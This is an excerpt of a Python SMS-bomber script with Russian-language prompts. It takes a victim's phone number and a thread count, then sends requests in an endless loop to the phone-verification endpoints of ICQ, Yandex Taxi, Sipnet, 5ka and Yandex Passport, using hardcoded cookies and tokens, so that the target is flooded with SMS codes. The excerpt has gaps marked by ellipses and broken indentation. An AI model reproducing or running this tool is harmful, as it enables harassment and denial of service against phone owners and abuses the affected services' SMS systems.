...
ns = 'MSG NOT SEND'
print(colored('''
 Для оставки скрипта на телефоне - закройте терминал
 на компьютере - Ctrl + Z
 
 Номер вводить с плюсом
 ''','cyan'))
phone = input('Номер:')
if phone[0:3] == '+79':
  countT = int(input('Потоки: '))
print(colored('''Бомба полетела''', 'magenta'))
def infinity():
 while True:
  if phone[0:3]=='+79':
				cl = requests.session()
				...
				if rGT.status_code == 200:
				  print(colored(s,'green'))
					...
					print(colored(ns,'red'))
				rIC = requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data = {'msisdn':phone[1:],'locale':'en','countryCode':'ru','k':'ic1rtwz1s1Hj1O0r','platform':'web','version':'1','client':'icq','r':'46763'}, headers = {'Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Host':'www.icq.com','Origin':'https://web.icq.com','Referer':'https://web.icq.com/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'})
				if(rIC.status_code == 200):
					print(colored(s,'green'))
				else:
					print(colored(ns,'red'))
				...
				if(rGRAB.status_code == 200):
					...
					print(colored(ns,'red')) 
				rYT = requests.post('https://m.taxi.yandex.ru/3.0/auth/',data = {'id':'08f84247220c36d308c802736dcc58af','phone':phone},headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'ru-RU','Connection':'keep-alive','Cookie':'_id=7a7cd323a887d891192610c9c3406349;_ym_d=1552824752;_ym_isad=2;_ym_uid=1552824752982775742;_ym_wasSynced=%7B%22time%22%3A1552850261519%2C%22params%22%3A%7B%22eu%22%3A1%7D%2C%22bkParams%22%3A%7B%7D%7D;fuid01=5c8d8dd2118e8d4a.ZzYLCgUwHZG-G2j-tu141V5dkl9qQ8_w0KW_80u0cW9AGB2dB9ood4s6uivmMu_w8emgBKjrEUMIkrS2G3D6jJJi3BdcD7hmw_YEqPADgSvNO2Lp8AwxQAvZSWDTjyFR;gdpr=1;i=y+LF5v3Aclb2XpLoSvwahQquBla32PYbdEAnObsu/DfHtJ+rCJqo6VQMq9tJtCjYpoRTzU8L9SvPnR57dqJ1qjrBRzs=;mda=0;yandexuid=536383211552780201;yp=1584316206.yrts.1552780206#1584316206.yrtsi.1552780206;','Host':'m.taxi.yandex.ru','Referer':'https://m.taxi.yandex.ru/','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0','X-Requested-With':'XMLHttpRequest','x-requested-uri':'https://m.taxi.yandex.ru/'})
				if rYT.status_code == 200:
					print(colored(s,'green'))
				else:
					print(colored(ns,'red')) 
				rSN = requests.get('https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&phone='+phone, data = {'oper':'9','phone':phone}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Host':'register.sipnet.ru','Origin':'https://www.sipnet.ru','Referer':'https://www.sipnet.ru/tarify-ip-telefonii','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'})
				if rSN.status_code == 200:
					print(colored(s,'green'))
				else:
					print(colored(ns,'red')) 
				rPK = requests.post('https://my.5ka.ru/api/v1/services/phones/add', data = {'number':phone}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'','Host':'my.5ka.ru','Referer':'https://my.5ka.ru/forgot_password','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Authorization':'Tokenbb71fd472873b8f0dc1edfc0c24ecfd478e83a43'})
				if rPK.status_code == 200:
					print(colored(s,'green'))
				else:
					print(colored(ns,'red')) 
				rYP = requests.post('https://passport.yandex.com/registration-validations/phone-confirm-code-submit', data = {'track_id':'443094351f0679bc68dfd50025907a9058','csrf_token':'64ecaba01cd2cbcccbe81da19571eda854002267:1553547854103','password':'huihu76t7gi','login':'adfsdhi76giuy','number':phone}, headers = {'Accept-Encoding':'gzip, deflate, br','Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Cookie':'_ym_d=1553558585;_ym_isad=2;_ym_uid=15535585858461222;_ym_visorc_784657=w;_ym_wasSynced=%7B%22time%22%3A1553558576111%2C%22params%22%3A%7B%22eu%22%3A1%7D%2C%22bkParams%22%3A%7B%7D%7D;gdpr=0;mda=0;yandexuid=462756331553547768;','DNT':'1','Host':'passport.yandex.com','Referer':'https://passport.yandex.com/registration?mode=register','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0','X-Requested-With':'XMLHttpRequest'})
				if rYP.status_code == 200:
					print(colored(s,'green'))
				else:
					print(colored(ns,'red')) 	
  else:
				...
				if(rVI.status_code == 204):
				  ...
				  print(colored(ns,'red'))
				rIC = requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php', data = {'msisdn':phone,'locale':'en','countryCode':'ru','k':'ic1rtwz1s1Hj1O0r','platform':'web','version':'1','client':'icq','r':'46763'}, headers = {'Accept-Language':'en-US,en;q=0.5','Connection':'keep-alive','Host':'www.icq.com','Origin':'https://web.icq.com','Referer':'https://web.icq.com/','User-Agent':'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'})
				if(rIC.status_code == 200):
				  print(colored(s,'green'))
				else:
				  print(colored(ns,'red'))
